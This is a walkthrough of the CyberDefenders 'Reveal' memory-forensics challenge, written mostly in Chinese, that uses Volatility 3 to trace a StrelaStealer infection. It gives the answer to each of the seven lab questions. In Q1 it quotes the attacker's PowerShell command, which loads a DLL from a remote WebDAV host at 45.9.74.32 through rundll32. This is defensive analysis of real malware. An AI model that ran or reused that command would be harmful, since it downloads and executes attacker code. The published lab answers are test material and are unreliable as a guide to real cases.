---
title: Cyberdefenders Reveal Walkthough
tags: [Cyber Defender, Memory Forensic, Volatility, Stealer]

---

> [name=Xiaobai0426]

###### tags: `Memory Forensic` `Volatility` `Stealer`

# Cyberdefenders Reveal Hunt Walkthough
    Category: Endpoint Forensics
    
題目來源：
https://cyberdefenders.org/blueteam-ctf-challenges/reveal/

## Details

Instructions

- Uncompress the lab (pass: cyberdefenders.org)

Scenario:

As a cybersecurity analyst for a leading financial institution, an alert from your SIEM solution has flagged unusual activity on an internal workstation. Given the sensitive financial data at risk, immediate action is required to prevent potential breaches.

Your task is to delve into the provided memory dump from the compromised system. You need to identify basic Indicators of Compromise (IOCs) and determine the extent of the intrusion. Investigate the malicious commands or files executed in the environment, and report your findings in detail to aid in remediation and enhance future defenses.

中文翻譯:

作為一家領先金融機構的網路安全分析師，您的 SIEM 解決方案發出的警報已標記出內部工作站上的異常活動。鑒於敏感的財務數據面臨風險，需要立即採取行動防止潛在的違規行為。

您的任務是深入研究受感染系統中提供的記憶體轉儲。您需要確定基本的入侵指標 （IOC） 並確定入侵的程度。調查環境中執行的惡意命令或檔，並詳細報告您的發現，以幫助進行補救並增強未來的防禦能力。

## Tools:

- Volatility 3

---

## Question 

---

### Q1. Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?
==Ans:powershell.exe==

1. 使用volatility內建指令malfind先檢查是否有異常檔案。
```
python3 .\vol.py -f .\[filename] windows.malfind 
```
![image](https://hackmd.io/_uploads/rJseqsyYC.png)

2. 偵測到powershell.exe有異常，所以我繼續往下找出可疑的Command，使用cmdline。
```
python3 .\vol.py -f .\[filename] windows.cmdline 
```
![image](https://hackmd.io/_uploads/Hk5O5oytC.png)

3. 發現到不正常的指令碼，確認powershell為異常檔案。 

:::info
powershell.exe  -windowstyle hidden net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry

這段指令碼的主要作用是隱藏 PowerShell 窗口，然後連接到一個遠程的 WebDAV 資源，並使用 rundll32 執行從該資源加載的 DLL 文件中的特定函數。
:::

### Q2. Knowing the parent process ID (PID) of the malicious process aids in tracing the process hierarchy and understanding the attack flow. What is the parent PID of the malicious process?
==Ans:4120==

1. 使用volatility內建指令pstree查看樹狀圖。
```
python3 .\vol.py -f .\[filename] windows.pstree
```
![螢幕擷取畫面 2024-07-25 184126](https://hackmd.io/_uploads/BkH-3sJYA.png)

2. 從上圖可知PID為3692，PPID為4120，PPID就是此題的答案。

### Q3. Determining the file name used by the malware for executing the second-stage payload is crucial for identifying subsequent malicious activities. What is the file name that the malware uses to execute the second-stage payload?
==Ans:3435.dll==

1. 從Q1的異常指令碼就可看出注入的檔案名稱。
![螢幕擷取畫面 2024-07-25 183953](https://hackmd.io/_uploads/HkETis1F0.png)

### Q4. Identifying the shared directory on the remote server helps trace the resources targeted by the attacker. What is the name of the shared directory being accessed on the remote server?
==Ans:davwwwroot==

承上題
![螢幕擷取畫面 2024-07-25 184244](https://hackmd.io/_uploads/S1sBhiyK0.png)

### Q5. What is the MITRE sub-technique ID used by the malware to execute the second-stage payload?
==Ans:T1218.011==

1. 將相關指令碼丟到網上搜尋，就可以看到MITRE有列出該技術的ID。
![image](https://hackmd.io/_uploads/rJF-Y3kF0.png)

### Q6. Identifying the username under which the malicious process runs helps in assessing the compromised account and its potential impact. What is the username that the malicious process runs under?
==Ans:Elon==

1. 這一題可以去看環境變數"USERNAME"，然後找到powershell.exe的執行使用者。
所以使用volatility的指令"envars"就能列出來。
```
python3 .\vol.py -f .\192-Reveal.dmp windows.envars | Select-String -Pattern "USERNAME"
```
![螢幕擷取畫面 2024-07-25 184558](https://hackmd.io/_uploads/S16-aiktR.png)

### Q7. Knowing the name of the malware family is essential for correlating the attack with known threats and developing appropriate defenses. What is the name of the malware family?
==Ans:StrelaStealer==

1. 將Q1得知的指令碼中的IP位置丟至Virustotal就能看到相關訊息，
其中就寫到了該IP由STRELASTEALER使用著。
![image](https://hackmd.io/_uploads/HJLJu3JY0.png)

---